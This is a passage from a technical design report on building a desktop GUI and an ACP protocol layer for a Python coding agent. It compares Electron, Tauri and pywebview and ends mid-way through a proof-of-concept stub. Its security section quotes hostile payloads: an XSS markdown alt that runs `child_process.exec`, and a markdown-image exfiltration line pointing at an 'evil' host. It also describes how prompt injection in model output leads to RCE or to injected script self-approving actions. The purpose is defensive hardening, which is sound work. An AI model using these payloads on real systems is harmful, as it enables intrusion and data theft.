## 10. Frontend rendering libraries (verified 2026-10-01 via GitHub API / npm)

| Library | Stars | Latest | License | Use |
|---|---|---|---|---|
| [markdown-it](https://github.com/markdown-it/markdown-it) | 21.9k | 15.0.2 (pushed 2026-09-12) | MIT | Fast framework-free parser; fine for vanilla/Svelte |
| [react-markdown](https://github.com/remarkjs/react-markdown) | 15.9k | 10.1.0 (pushed 2026-09-24) | MIT | React renderer, no raw-HTML by default |
| [shiki](https://github.com/shikijs/shiki) | 13.8k | 4.5.0 (pushed 2026-10-01) | MIT | VS Code-grade highlighting; load lazily |
| [monaco-editor](https://github.com/microsoft/monaco-editor) | 46.8k | 0.57.0 (pushed 2026-09-30) | MIT | `createDiffEditor` for side-by-side diffs; heavy (multi-MB), worker setup needed in Electron/Tauri |
| [diff2html](https://github.com/rtfpessoa/diff2html) | 3.4k | 3.4.56 (pushed 2026-05-08, slower cadence) | MIT | Renders unified-diff text to HTML; lightweight alternative to Monaco |
| [streamdown](https://github.com/vercel/streamdown) | 5.7k | 2.7.0 (pushed 2026-09-30) | GitHub shows NOASSERTION (check LICENSE before use) | Drop-in react-markdown replacement for streaming; repairs unterminated markdown |

Streaming-jank techniques: naive re-render of the whole message each chunk is quadratic and breaks text selection ([issue 346](https://github.com/SystemSculpt/obsidian-systemsculpt-ai/issues/346)); fix by splitting at block boundaries (blank lines, fence markers), memoizing closed blocks and re-rendering only the unclosed tail ([AI SDK cookbook](https://ai-sdk.dev/cookbook/next/markdown-chatbot-with-memoization), [incremental render issue](https://github.com/cymoo/lovia/issues/110)); Streamdown does repair plus block memo but still re-lexes the whole text per frame ([Lody #420](https://github.com/LodyAI/Lody/issues/420)). Practical advice: batch chunks per animation frame; highlight code blocks only when closed; use Monaco diff only in a lazy "review" panel and diff2html or a plain `<pre>` for inline chat diffs. TMT's own character-by-character cadence can be a CSS/typewriter effect on already-received text.

## 11. Effort estimate (one developer, engine already separated from the terminal UI; my judgement, not sourced)

| Option | Weeks | Notes |
|---|---|---|
| ACP adapter only (no custom GUI) | 1-2 (stdlib hand-rolled NDJSON JSON-RPC, core mapping, test against Zed and one Windows client); +1 for `_tmt` extensions | Fastest to something usable; loses agent sidebar, undo UI, choose dialog polish |
| pywebview | 4-6 | Engine in-process, but still a full frontend (chat, dialogs, sidebar, settings); packaging/updater are DIY (+1) |
| Electron | 5-7 | Frontend is the bulk; spawn/IPC/update tooling is well trodden; installer + signing +1 |
| Tauri 2 | 6-9 | Same frontend; plus Rust glue, Job Object, sidecar packaging; first-time Rust learning curve |

## 12. Top 2 picks

1. **Electron + frozen onedir Python engine speaking NDJSON JSON-RPC over stdio (ACP-aligned).** This is what Codex desktop, Goose and Interpreter Workstation do; the app-server pattern is proven on Windows; Chromium means Monaco/shiki/markdown render identically; electron-updater + NSIS is mature; TMT already distributes via npm. Cost: 80-150 MB installer, more RAM.
2. **Tauri 2 + the same engine and protocol.** Same architecture with a ~5 MB shell and WebView2; choose it if installer size and memory matter more than Rust build complexity and the sidecar-kill pitfalls (needs Job Object). Because both picks share the engine protocol, the choice is reversible: build the protocol and an ACP-compatible core first (also gives Zed/JetBrains clients for free), then pick the shell.

Fallback: pywebview for a quick all-Python prototype (engine in-process). Not recommended as the final product: thin updater/packaging story. Avoid: Eel (archived), Streamlit/Gradio wrappers, pytauri (pre-1.0), Wails (Go, v3 beta).

## 13. Grounding the protocol in TMT's real event names (read from TMT.py, agent_manager.py, agent_ui.py, agent_plan.py)

What the code actually has today (read-only inspection):

| TMT today (file) | Signature / shape | Natural wire message | Mismatch / note |
|---|---|---|---|
| `stream_handler` events (`TMT.py` ~81-135) | `handle((kind, value))` with kinds `first_content`, `text`, `output`, `usage`, `action`, `progress`, `next_step`, `error` | `text` -> `stream.text`; `usage` -> `usage`; `action` (label from `ACTION_LABELS`) -> `turn.progress` status; `progress` -> `turn.progress` (permanent line); `next_step` -> held, send once at turn end; `error` -> JSON-RPC error on the `turn.start` response | `output` is raw generated characters used only for the live token meter; do NOT put it on the wire (duplicates `text`). The model stream is JSON actions ("exactly one JSON object"), so `text` may be the visible reply only; check which stream is user-visible before wiring |
| `transcript.emit_kind(kind, message, stage, **detail)` (`agent_ui.py` ~1016, `EVENT_KINDS` ~741) | kinds: progress, milestone, warning, success, error, tool, file_read, file_edit, file_create, file_delete, command, test, background_agent, next_step_suggestion, final; `detail` carries measured facts (`added`, `removed`, `lines`, `files`, `bytes`, `calls`, `status`) | `turn.progress` with `kind` = ACP tool kind (`file_read`->read, `file_edit`/`file_create`->edit, `file_delete`->delete, `command`/`test`->execute, `tool`->other), `detail` passed through; `final` -> closing message | Today events are rendered to terminal text inside `emit()` (`lines_for`); the wire needs the structured `AgentEvent` before formatting. `emit` is the hook point: add a sink list so GUI and terminal both subscribe. `file_edit` events carry counts (+added -removed) but not necessarily the diff text; GUI needs old/new text or a unified diff added to `detail` |
| `approve(question, pattern="")` (`_command_approval`, `TMT.py` ~488) | Called on the engine thread; returns the raw typed lowercase string (`"y"`, `"always"`, `"n"`...) or `False` when no terminal; `agent_bash` owns what yes/always mean | `approval.request` request, block for response; adapter maps option ids to the same strings: `allow_once`->`"y"`, `allow_always`->`"always"`, `reject_once`->`"n"`, cancelled->`False` | Good: it is already a blocking callable injected via the action context, so a GUI only swaps the callable (a context with no `approve` key already means "nobody watching" and is answered no). Terminal-specific parts (type-ahead stop/start, `write_above`) disappear. Pattern string must travel in params (ACP has no field for it: use `_meta`) |
| `choose(text, keys)` (`_question_asker`, `TMT.py` ~560) | Returns one key from `keys`, `""` = user dismissed (Esc), `None` = nobody could be asked; Ctrl-C raises `KeyboardInterrupt` | `question.request` request; result `{"key": k}`; dismissal `{"key": ""}`; no UI -> `null` | `agent_ask.answer` distinguishes `None` from `""` and tells the model which; the wire must preserve that distinction (do not collapse both to an error). `Ctrl-C` has no GUI analogue: map the Cancel button to `turn.cancel`, which should unwind a pending question by answering it `None`/raising the same `KeyboardInterrupt` |
| `AgentManager.subscribe(listener)` (`agent_manager.py` ~458) | `listener(event_name, record)`, called outside the lock, listener exceptions swallowed, from worker threads. Events: `agent_created`, `agent_started`, `agent_activity_changed`, `agent_token_update`, `agent_completed`, `agent_killed`, `agent_failed`, `agent_timed_out`, `agent_violation`, `agent_removed_from_ui`, `agent_result_available`, `note_started`, `note_completed`; statuses end in `TERMINAL` = completed/killed/failed/timed_out; cap of 10 workers (`CapacityError`) | `_tmt/agents.changed` (full list snapshot, debounced ~100 ms) or per-event `_tmt/agent.event {name, record.as_dict()}` | Fine-grained events are better than a snapshot for the sidebar; but `agent_token_update` fires at action rate, so debounce. Listener runs on worker threads: the sink must only enqueue, never write stdout directly (interleaving) |
| `Plan` / `PlanStep.as_dict()` (`agent_plan.py`) | `{"id":"S1","position":1,"title":...,"status":...}`; statuses pending/completed/... via `normalize_status` | `plan.changed` with `entries` mapped to ACP `{content, priority, status}` | No change event was found in the files read (only the `Plan` class and a `refusal` helper); a hook is needed where the plan is mutated (not verified where). ACP statuses are only pending/in_progress/completed, TMT may have more: map the extras |
| Cancel | Session loop ends a turn on `KeyboardInterrupt`; workers raise `WorkerCancelled` / `WorkerTimedOut` (`agent_manager.py`) | `turn.cancel` -> raise `KeyboardInterrupt` (or set a flag) in the turn thread; return `stopReason: "cancelled"` | The terminal's Ctrl-C is a signal-like exception delivered to the main thread. In a GUI the engine runs on a worker thread, so a cooperative cancel flag checked in the stream reader (as workers already do with their cancel flag) is needed; `KeyboardInterrupt` cannot be injected into another thread safely |

Protocol implication: the engine already has three callback seams (stream handler, `emit_kind` transcript, `approve`/`choose` in the action context, plus the manager's `subscribe` bus), so a JSON-RPC server is an adapter that provides alternative implementations of those callables, not an engine rewrite. The main risk is that rendering (`lines_for`, `write_above`, live-region repaint arithmetic) is interleaved with emission; each emission site should publish a structured event first.

## 14. Security: rendering model output in a webview

Threat model: model output is attacker-influenced (prompt injection through repo files, web pages, tool output), so every rendered string and every link is untrusted, and the bridge to Python/Rust/Node is the prize.

**Real incident (directly on point).** AnythingLLM Desktop <= v1.11.1: a model response containing a crafted markdown image alt (`![" onerror="require('child_process').exec(...)](x)`) was injected via `dangerouslySetInnerHTML` without DOMPurify, and because the Electron window had `nodeIntegration: true` + `contextIsolation: false`, XSS became OS-level RCE. CVE-2026-32626, CVSS 9.6, published 2026-03-13, fixed in 1.11.2 ([advisory](https://github.com/Mintplex-Labs/anything-llm/security/advisories/GHSA-rrmw-2j6x-4mf2), [CVE page](https://cyberstrike.io/cve/CVE-2026-32626/)). Related: markdown-image exfiltration (EchoLeak CVE-2025-32711) and prompt-injection-to-RCE in coding agents (Cursor CVE-2025-54135 "CurXecute") ([survey](https://hivesecurity.gitlab.io/blog/prompt-injection-attack-detect-2026/)). Lesson: the XSS hole is the markdown/HTML pipeline; the blast radius is decided by shell config.

**Renderer-side rules (all shells).**
1. markdown-it with `html: false` (default) or react-markdown (no raw HTML unless `rehype-raw`); never `innerHTML`/`dangerouslySetInnerHTML` of model text. If HTML is ever allowed, sanitise with DOMPurify or `rehype-sanitize` (allow-list) *after* rendering (library names from my knowledge, not re-verified here).
2. Escape all attribute values (the AnythingLLM bug was an unescaped `alt`); highlight code via shiki's escaped output.
3. Block remote images/auto-fetch by default (CSP `img-src 'self' data:`), otherwise `![](https://evil/?q=SECRET)` exfiltrates silently (the EchoLeak class). Offer click-to-load.
4. Links: render as `<a>` with a click handler that opens `http(s)` URLs in the system browser only after scheme allow-listing, never navigates the app window; deny `javascript:`, `file:`, custom schemes.
5. Strict CSP: `default-src 'self'; script-src 'self'; connect-src 'self'` and no `unsafe-eval`/inline script. TMT's own file paths/diffs shown in the UI are also untrusted text.

**Electron** ([official checklist](https://www.electronjs.org/docs/latest/tutorial/security)): keep `nodeIntegration: false` (default since 5), `contextIsolation: true` (default since 12), `sandbox: true` (default since 20), define a CSP, validate the `sender` of every IPC message (item 17), restrict navigation with `will-navigate` (13), deny new windows with `setWindowOpenHandler` (14), never pass untrusted URLs to `shell.openExternal` (15), disable `webviewTag`. Expose a minimal preload API (`send(rpcLine)`, `onMessage`) via `contextBridge` rather than raw `ipcRenderer`. Further reading: [Doyensec](https://doyensec.com/resources/us-17-Carettoni-Electronegativity-A-Study-Of-Electron-Security-wp.pdf), [Bishop Fox](https://bishopfox.com/blog/reasonably-secure-electron), [SecureLayer7 XSS-to-RCE cases](https://blog.securelayer7.net/electron-app-security-risks/). Note that in the Electron design the renderer only needs to relay JSON-RPC lines, so an XSS there can still answer approval dialogs: render approvals in a separate trusted UI path (e.g. native `dialog.showMessageBox` from the main process, or sender-validated IPC) so injected script cannot self-approve.

**Tauri 2** ([capabilities](https://v2.tauri.app/security/capabilities/), [CSP/config](https://v2.tauri.app/reference/config/)): the webview is untrusted by default; a window matching no capability has no IPC access at all. Define one capability file granting only your own commands (`rpc_send`) plus `core:event:default`; do not enable the shell, fs or opener plugins for the main window. Scopes constrain plugin commands. Set a CSP in `tauri.conf.json` (`ipc:` and `https://ipc.localhost` must be allowed). The optional Isolation pattern runs a sandboxed iframe that intercepts and encrypts IPC. Tauri's default-deny model is a real advantage over Electron's defaults, but the self-approval concern above applies equally (the `rpc_send` command is what XSS would call): add a Rust-side check so `approval` replies can only answer request ids that the engine actually issued.

**pywebview**: `js_api` exposes every public method of the object (names starting with `_` are not exposed; only basic types can be returned) ([API docs](https://pywebview.flowrl.com/api/), [bridge guide](https://pywebview.flowrl.com/guide/interdomain.html)). Any script in the page can call them, so: load only local bundled files (never remote URLs), expose a tiny `Api` class (`send`, `answer`, `cancel`) and keep engine objects in an underscore-prefixed attribute so the bridge cannot traverse into them; strict CSP applies equally. pywebview has no built-in capability system (Tauri-style), so it is the weakest of the three here (my assessment).

## 15. WebView2 runtime distribution on Windows (Microsoft docs, updated 2026-09-02)

Source: [Evergreen vs fixed](https://learn.microsoft.com/en-us/microsoft-edge/webview2/concepts/evergreen-vs-fixed-version), [distribution](https://learn.microsoft.com/microsoft-edge/webview2/concepts/distribution).
- **Evergreen** (recommended): runtime not packaged with the app; auto-updates; shared by all apps. Preinstalled on **all Windows 11** devices; Microsoft pushed it to eligible managed Windows 10 devices, but Microsoft still recommends shipping the installer for edge cases.
- **Evergreen Bootstrapper**: tiny online installer (needs internet, depends on Microsoft CDN unless you bundle the bootstrapper in your installer). **Evergreen Standalone Installer**: large offline installer for air-gapped users, package inside your installer.
- **Fixed Version**: you ship a specific runtime inside the app (per-app copy, no auto-updates, more disk, cannot be installed via an installer); pywebview 6.1 exposes `WEBVIEW2_RUNTIME_PATH` for this ([changelog](https://pywebview.flowrl.com/changelog)). Gives version certainty but you own security patching of an embedded Chromium.
- Server SKUs: not covered by the page I fetched (unverified); treat Windows Server as "install the standalone runtime explicitly".
- Implication: Tauri and pywebview depend on this; Electron does not (it bundles Chromium, which is why it is 80-150 MB but needs no OS dependency). For TMT: Tauri's `bundle.windows.webviewInstallMode` offers `downloadBootstrapper` (default, +0 MB, needs internet), `embedBootstrapper` (+~1.8 MB), `offlineInstaller` (+~127 MB), `fixedRuntime` (+~180 MB) and `skip` ([Tauri docs](https://v2.tauri.app/distribute/windows-installer/)). `embedBootstrapper` is the sensible default; use `offlineInstaller` for air-gapped enterprise builds. This also means the "Tauri is 5 MB" figure grows to ~130 MB for the offline variant, close to Electron.

## 16. Accessibility (screen readers, keyboard)

- Electron/Chromium and WebView2 both expose the Chromium accessibility tree to Windows assistive tech; keyboard navigation, ARIA roles and focus management are in your HTML, so a chat UI needs deliberate work: `role="log"` / `aria-live="polite"` on the transcript (throttled, otherwise a screen reader reads every streamed token), focus trap and `role="alertdialog"` on approval modals, visible focus rings, shortcuts for Allow once / Always / Deny.
- WebView2 has a known history of accessibility gaps: an open feedback issue reports a WebView2 control "completely inaccessible" to NVDA and JAWS and only partly to Narrator ([WebView2Feedback #2330](https://github.com/MicrosoftEdge/WebView2Feedback/issues/2330)), and NVDA has an open request for loading app modules for WebView2-based UIs ([nvda #16705](https://github.com/nvaccess/nvda/issues/16705)). I could not confirm the current (2026) state of these (unverified); test with NVDA, Narrator and keyboard-only before choosing Tauri/pywebview, since a native WinUI/Win32 UI would use UI Automation directly and be the accessibility baseline.
- Electron has the larger body of working screen-reader practice (VS Code, Slack, Codex are Electron apps), but its own history shows historic crashes/gaps ([electron #3696](https://github.com/electron/electron/issues/3696)). Chromium's accessibility mode turns on automatically when assistive tech is detected (my understanding, unverified here).
- Streaming chat is the hard case in any toolkit: announce completed messages and approvals, not each chunk.

## 17. How other Python (and open-source) coding agents got a GUI

| Project | UI tech | How UI talks to the core | Desktop or browser | Evidence / status |
|---|---|---|---|---|
| **gptme** (Python, MIT, 4.4k stars) | React web UI (`webui/`, hosted at chat.gptme.org) **and a Tauri desktop app** (`tauri/`, Linux/macOS/Windows, auto-update since v0.32.1, July 2026); plus `packages/gptme-acp` (ACP for editors) | Web UI and desktop talk to `gptme-server` (REST + streaming) over loopback; the Tauri app bundles `gptme-server` as a sidecar | Both. **Closest analogue to TMT.** The standalone repo `gptme-tauri` was archived 2026-03-04 and merged into the main repo | [main repo](https://github.com/gptme/gptme), [gptme-tauri](https://github.com/gptme/gptme-tauri) (12 stars, archived; the code now lives in `tauri/` of the main repo, see 17b). Windows first-run problems: sidecar connect needed a manual retry, wrong font because the Tauri CSP blocked a CDN font, only API-key auth in the desktop UI ([issue 3906](https://github.com/gptme/gptme/issues/3906)) |
| **OpenHands** (Python) | React frontend + FastAPI; V0 used Socket.IO on the ASGI app; V1 (Sept 2025 onward) rebuilt around a Python Agent SDK with an `agent-server` FastAPI app: REST for control, WebSocket for event streaming | HTTP/WebSocket on localhost or inside a Docker sandbox (official image bundles API server, VS Code web, VNC, Chromium) | Browser app on localhost (plus cloud); CLI separately | [Path to OpenHands v1](https://www.openhands.dev/blog/the-path-to-openhands-v1), [SDK paper](https://arxiv.org/html/2511.03690v1), [SDK architecture docs](https://docs.openhands.dev/sdk/arch/overview), [DeepWiki](https://deepwiki.com/OpenHands/OpenHands/1.3-product-variants) |
| **Aider** (Python) | Streamlit (`aider --browser`, `aider/gui.py`) | In-process: the Streamlit script drives the same `Coder` object | Browser app on localhost, labelled "experimental" in the docs; never became the main UI | [docs](https://aider.chat/docs/usage/browser.html), [DeepWiki](https://deepwiki.com/Aider-AI/aider/5.2-streamlit-web-gui), [issue 595](https://github.com/paul-gauthier/aider/issues/595) |
| **Open Interpreter** (Python) | Classic version: terminal only. Newer "Interpreter Workstation": Electron shell with desktop and browser renderers | Workstation speaks Open Interpreter's versioned "app-server protocol" to the agent runtime, local or remote | Desktop (Electron) + browser | [interpreter-workstation](https://github.com/openinterpreter/interpreter-workstation) (16 stars), [desktop docs](https://www.openinterpreter.com/docs/desktop) |
| **Goose** (Rust) | Electron + React | Spawns `goosed`, REST+SSE on 127.0.0.1; moving to ACP (JSON-RPC over HTTP/WebSocket) | Desktop | [discussion 7697](https://github.com/block/goose/discussions/7697) |
| **Continue** (TypeScript) | React GUI in an IDE webview (VS Code, JetBrains) | `IMessenger` abstraction over IPC / webview `postMessage` / TCP; about 80 typed message handlers; core ships as a bundled sidecar binary | Editor extension | [DeepWiki: GUI and protocols](https://deepwiki.com/continuedev/continue/2.3-gui-system) |
| **SWE-agent** (Python) | React frontend + Flask backend (v0.7 web UI) | HTTP to the Flask backend | Browser on localhost; **now maintenance-only**; successor mini-swe-agent dropped its "visual" UI in v2 (low adoption, high maintenance) | [web UI docs](https://swe-agent.com/0.7/usage/web_ui/), [mini-swe-agent](https://github.com/swe-agent/mini-swe-agent), [v2 migration](https://mini-swe-agent.com/latest/advanced/v2_migration/) |
| **Plandex** (Go) | CLI only | Client/server: local CLI to a (self-hosted) server with PostgreSQL | Terminal; cloud shut down Nov 2025, repo dormant since 2025-10-03 (15.4k stars) | [DEV review](https://dev.to/jovan_chan_9500711396d4e6/plandex-v2-review-2026-cloud-shut-down-self-hosted-survives-is-the-terminal-agent-still-worth-11pp). Stale: no GUI to copy |
| **Claude Code IDE integrations** | VS Code / JetBrains extensions (panel + native diffs) | The extension starts a loopback WebSocket MCP server and writes `~/.claude/ide/<port>.lock` with an auth token; the CLI connects with an `X-Claude-Code-Ide-Authorization` header | Editor extension; the extension bundles the CLI | [VS Code docs](https://code.claude.com/docs/en/vs-code), [protocol notes](https://github.com/coder/claudecode.nvim/blob/main/PROTOCOL.md), [codepointer](https://codepointer.dev/p/claude-code-cli-bridging-terminal) |
| **Codex** (Rust core) | VS Code extension and Electron desktop app | Both launch `codex app-server`, JSON-RPC over stdio (JSONL) | Editor extension + desktop | [app-server docs](https://developers.openai.com/codex/app-server), [Codex harness post](https://openai.com/index/unlocking-the-codex-harness/) |
| **Cline** | VS Code webview (React) | gRPC-over-postMessage; standalone gRPC server on port 26040; its desktop sidecar left orphan processes on Windows ([issue 14221](https://github.com/cline/cline/issues/14221)) | Editor extension (+CLI) | [DeepWiki](https://deepwiki.com/cline/cline/6.1-grpc-communication-system) |

**Patterns that emerge** (interpretation is mine).
1. The engine becomes a separately launchable process or server with a structured event/command protocol; every project that got a durable GUI did this first (gptme-server, goosed, codex app-server, OpenHands agent-server, Open Interpreter app-server).
2. Four delivery routes: *browser UI on localhost* (OpenHands, SWE-agent, aider, gptme webui: cheapest, no packaging, but the user must start a server and gets no native dialogs or tray), *desktop shell around the same web UI* (gptme Tauri; Goose, Codex and Workstation on Electron: what the user asked for), *editor extension* (Continue, Cline, Claude Code, Codex), and *a standard protocol* (ACP: Zed, JetBrains, gptme-acp, Goose roadmap).
3. The Python projects mostly chose a **local HTTP/WebSocket server** (gptme, OpenHands, SWE-agent), while the more recent agent-first apps converged on **JSON-RPC over stdio** (Codex, ACP).
4. Python core plus Tauri desktop has exactly one real precedent (gptme), and it reported Windows rough edges (sidecar connect race, CSP versus fonts).
5. Streamlit-style GUIs (aider) stayed experimental, and the SWE-agent / mini-swe-agent UIs were dropped for maintenance cost: do not build the primary GUI on a framework whose model differs from the engine's event model.
6. gptme is the pattern to copy: one Python engine, a server/protocol layer, a web UI, a Tauri wrapper, and an ACP package, all in one repo. That matches this report's recommendation of "protocol first, shell second".

### 17b. Source-level verification (read from the actual repositories, 2026-10-01)

**gptme desktop app (Python engine + Tauri 2 + PyInstaller sidecar), read from `gptme/gptme` master, directory `tauri/`:**
- `tauri/src-tauri/tauri.conf.json`: `"externalBin": ["../bins/gptme-server"]`; `frontendDist` `../../webui/dist` (the same React webui as the browser version); `identifier` `org.gptme.tauri`; updater plugin with a minisign `pubkey` and endpoint `https://github.com/gptme/gptme/releases/latest/download/latest.json`; CSP `default-src 'self'; connect-src 'self' http: https: ws: wss:; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:` (the CSP is why a CDN font failed in issue 3906); deep-link scheme `gptme`. ([tauri.conf.json](https://raw.githubusercontent.com/gptme/gptme/master/tauri/src-tauri/tauri.conf.json))
- `tauri/src-tauri/src/lib.rs` (1,472 lines, [raw](https://raw.githubusercontent.com/gptme/gptme/master/tauri/src-tauri/src/lib.rs)): spawns the sidecar with `app.shell().sidecar("gptme-server")`, args `--cors-origin`, `--port 5700` (fixed default, overridable with `GPTME_SERVER_PORT`), `--watch-pid <tauri pid>`, and env `GPTME_SERVER_TOKEN` (a 32-byte random bearer token generated per run with `getrandom`, shared only with the sidecar and the webview). Transport is therefore **loopback HTTP/WebSocket on a TCP port with a bearer token**, not stdio.
- Orphan handling, in the authors' own comments: the PyInstaller **onefile** bootloader is the direct child of Tauri and the Python process is *its* child, so `child.kill()` is not enough ("the Python child of a PyInstaller onefile launcher ... become orphans that keep port 5700 occupied (#2260)"). Their fixes: (1) `--watch-pid` so the Python server exits when the Tauri PID disappears (because watching the parent PID inside Python only sees the bootloader); (2) on Windows `taskkill /F /T /PID` before `child.kill()`; (3) cleanup on both `RunEvent::ExitRequested` and `RunEvent::Exit` (macOS Cmd+Q skips the former); (4) a final "kill whatever listens on the port" sweep (`netstat -ano`, plus a PowerShell CIM command-line check on Windows) restricted to ports the app owns; (5) a startup path that reuses or recovers a leftover server from a previous crash. This is a concrete, field-tested checklist for TMT's Tauri design; it also shows the cost: about 1,500 lines of Rust process management.
- Build: `tauri/Makefile` target `gptme-server-build` calls `./scripts/build-sidecar.sh` (PyInstaller-style sidecar build; I did not read the script itself).
- Windows note: `main.rs` uses `windows_subsystem = "windows"` in release to avoid a console window.

**OpenHands (V1 agent server), read from `OpenHands/software-agent-sdk`:** `openhands-agent-server/openhands/agent_server/sockets.py` defines FastAPI `APIRouter(prefix="/sockets")` routers `conversation_sockets_router` and `bash_sockets_router`; the first WebSocket frame must be `{"type": "auth", "session_api_key": "..."}`; REST routers sit alongside (`conversation_router.py`, `event_router.py`, `bash_router.py`, `file_router.py`, `settings_router.py` ...) ([sockets.py](https://raw.githubusercontent.com/OpenHands/software-agent-sdk/main/openhands-agent-server/openhands/agent_server/sockets.py), [directory](https://github.com/OpenHands/software-agent-sdk/tree/main/openhands-agent-server/openhands/agent_server)). Transport is therefore **REST for commands + WebSocket for event streaming** (docs name the endpoint `/conversations/{conversation_id}/events/socket`). I could not open the main-repo frontend files at the paths I tried (`frontend/package.json` raw returned nothing), so the frontend-side client (and whether V1's UI still uses Socket.IO as V0 did) is UNVERIFIED at source level.

Interpretation for TMT: gptme is the one Python-engine-plus-Tauri precedent, and its own code shows that with a PyInstaller sidecar you must budget for process-tree kill, a parent-PID watchdog inside the engine, port-collision handling and token auth. A stdio JSON-RPC design removes the port, token and port-sweep problems entirely (the pipe dies with the parent), leaving only the onefile double-process issue, which onedir avoids.

## 18. Zed on Windows: launching TMT as a custom ACP agent

Zed documents custom agents under `agent_servers` in `settings.json` ([external agents docs](https://zed.dev/docs/ai/external-agents)); the debug view is the Command Palette action `dev: open acp logs`. For TMT (command `tmtcode`; the `--acp` flag is hypothetical until implemented) the user would add:

```json
{
  "agent_servers": {
    "TMT": {
      "type": "custom",
      "command": "tmtcode",
      "args": ["--acp"],
      "env": {}
    }
  }
}
```
Windows caveats: the docs say `command` should be on PATH and recommend the registry install on Windows. Whether Zed on Windows can execute an npm `.cmd` shim, or needs `"command": "cmd", "args": ["/c","tmtcode","--acp"]` or a full path to `python.exe` with `-m`, is **not verified**. The launcher must also keep stdout protocol-clean in `--acp` mode (no banner, no ANSI, no update notice) or Zed will fail to parse. I did not test with Zed.

### 18b. npm `.cmd` shim versus other launch forms in Zed on Windows

What is established: Zed spawns `agent_servers` entries (and `context_servers`) as plain child processes from `command` + `args` ([Zed docs](https://zed.dev/docs/ai/external-agents)). On Windows, npm creates `tmtcode.cmd` (a batch file), and a client that spawns a bare `tmtcode` will not find a real executable: widely reported for MCP servers in Zed/other clients, where the shipped workaround is `"command": "cmd", "args": ["/c", "npx", ...]` ([write-up](https://fransiscuss.com/2025/04/22/fix-spawn-npx-enoent-windows11-mcp-server/), [Zed MCP-on-Windows search results](https://mcpfind.org/blog/how-to-use-mcp-with-zed)). I found no Zed source or issue that states what happens for `agent_servers` specifically with a bare `.cmd` shim, so the exact behaviour for agent servers is **UNVERIFIED (not tested)**; treat the `cmd /c` form as the safe default and test the others.

Recommended `settings.json` (JSON needs doubled backslashes; replace paths):

1. Via the npm shim (most robust, works whether or not Zed resolves `.cmd`):
```json
{ "agent_servers": { "TMT": { "type": "custom", "command": "cmd", "args": ["/c", "tmtcode", "--acp"], "env": {} } } }
```
2. Direct Node, no shim (avoids cmd.exe quoting and an extra process; `node.exe` is a real executable on PATH):
```json
{ "agent_servers": { "TMT": { "type": "custom", "command": "node", "args": ["C:\\Users\\YOU\\AppData\\Roaming\\npm\\node_modules\\tmtcode\\bin\\tmtcode.js", "--acp"], "env": {} } } }
```
3. Direct Python from a source checkout (`python.exe` is a real executable; beware the Microsoft Store `python.exe` alias stub, use the full path or the `py` launcher):
```json
{ "agent_servers": { "TMT": { "type": "custom", "command": "py", "args": ["-3", "C:\\Coding\\compressarea\\TMT\\TMT.py", "--acp"], "env": { "PYTHONUNBUFFERED": "1", "PYTHONUTF8": "1" } } } }
```
Notes: the `--acp` flag does not exist in TMT yet (hypothetical). Ensure `--acp` mode writes only protocol JSON to stdout (no banner, no update notice, no ANSI) and unbuffered/UTF-8 output; `cmd /c` adds one extra process, so the engine should also exit on stdin EOF. Debug with the command-palette action `dev: open acp logs`.

## Appendix A: ACP stdlib proof of concept (proof of concept, tested locally with a scripted client, not with Zed)

Files (scratch folder, not in the repo): `acp_stub.py` (116 lines) and `acp_client_test.py` (64 lines). Run: `python acp_client_test.py`, which printed **`PASS: happy path (allow_once -> end_turn) and cancel (-> cancelled)`**. The stub uses only the stdlib; the scripted test ran on this machine's default Python 3.14, and the SDK validation (section 19) on Python 3.12. It was not run on 3.8 (not installed; vermin says its syntax/API floor is 3.3). Since writing this appendix the stub has also been validated against the official SDK's models and client (section 19: PASS, no changes needed). Field names follow the ACP schema ([schema](https://agentclientprotocol.com/protocol/schema)): `protocolVersion`, `agentCapabilities`, `agentInfo`, `sessionId`, `prompt[]`, `stopReason`, `session/update` with `update.sessionUpdate` of `agent_message_chunk` or `tool_call_update`, `session/request_permission` with `toolCall` and `options[{optionId,name,kind}]`, and the nested `outcome` result. The test asserts: initialize, session/new, prompt streams a chunk, the permission request arrives, `allow_once` is answered, a `tool_call_update` completes, a second chunk streams, and the prompt returns `end_turn`. A second run sends `session/cancel` while the permission request is pending and expects `stopReason: cancelled`. Not covered: `session/load`, `fs/*`, `terminal/*`, schema validation, multiple concurrent sessions, Zed interop.

`acp_stub.py`:

```python
"""Minimal stdlib-only ACP agent stub (NDJSON JSON-RPC 2.0 over stdio).
Proof of concept. Methods: initialize, session/new, session/prompt, session/cancel."""
import itertools
import json
import sys
import threading

proto = sys.stdout            # the wire: protocol messages ONLY
sys.stdout = sys.stderr       # stray print() can no longer corrupt the stream
wlock = threading.Lock()
ids = itertools.count(1)
pending = {}                  # our request id -> [Event, result]
cancelled = {}                # sessionId -> Event
sessions = set()


def send(obj):
    obj["jsonrpc"] = "2.0"
    with wlock:
        proto.write(json.dumps(obj) + "\n")
        proto.flush()


def reply(rid, result=None, error=None):
    if error is not None:
        send({"id": rid, "error": error})
    else:
        send({"id": rid, "result": result})


def update(session_id, upd):
    send({"method": "session/update",
          "params": {"sessionId": session_id, "update": upd}})


def chunk(session_id, text):
    update(session_id, {"sessionUpdate": "agent_message_chunk",
                        "content": {"type": "text", "text": text}})


def ask_permission(session_id):
    """Agent -> client request; blocks this worker thread until answered."""
    rid = "p%d" % next(ids)
    slot = pending[rid] = [threading.Event(), None]
    send({"id": rid, "method": "session/request_permission", "params": {
        "sessionId": session_id,
        "toolCall": {"toolCallId": "call_1", "title": "Run: echo hi",
                     "kind": "execute", "status": "pending"},
        "options": [
            {"optionId": "allow-once", "name": "Allow once", "kind": "allow_once"},
            {"optionId": "allow-always", "name": "Always allow", "kind": "allow_always"},
            {"optionId": "reject-once", "name": "Deny", "kind": "reject_once"}]}})
    slot[0].wait()
    pending.pop(rid, None)
    return slot[1]            # the response "result" dict, or None if cancelled


def run_prompt(rid, params):
    sid = params["sessionId"]
    stop = cancelled[sid]
    stop.clear()
    chunk(sid, "Looking at your request. ")
    if stop.is_set():
        return reply(rid, {"stopReason": "cancelled"})
    outcome = ask_permission(sid)
    if stop.is_set() or outcome is None or \
            outcome.get("outcome", {}).get("outcome") == "cancelled":
        return reply(rid, {"stopReason": "cancelled"})
    chosen = outcome["outcome"].get("optionId")
    update(sid, {"sessionUpdate": "tool_call_update", "toolCallId": "call_1",
                 "status": "completed" if chosen.startswith("allow") else "failed"})
    chunk(sid, "Done (%s)." % chosen)
    reply(rid, {"stopReason": "end_turn"})


def handle(msg):
    method, rid, params = msg.get("method"), msg.get("id"), msg.get("params") or {}
    if method is None:                       # a response to one of OUR requests
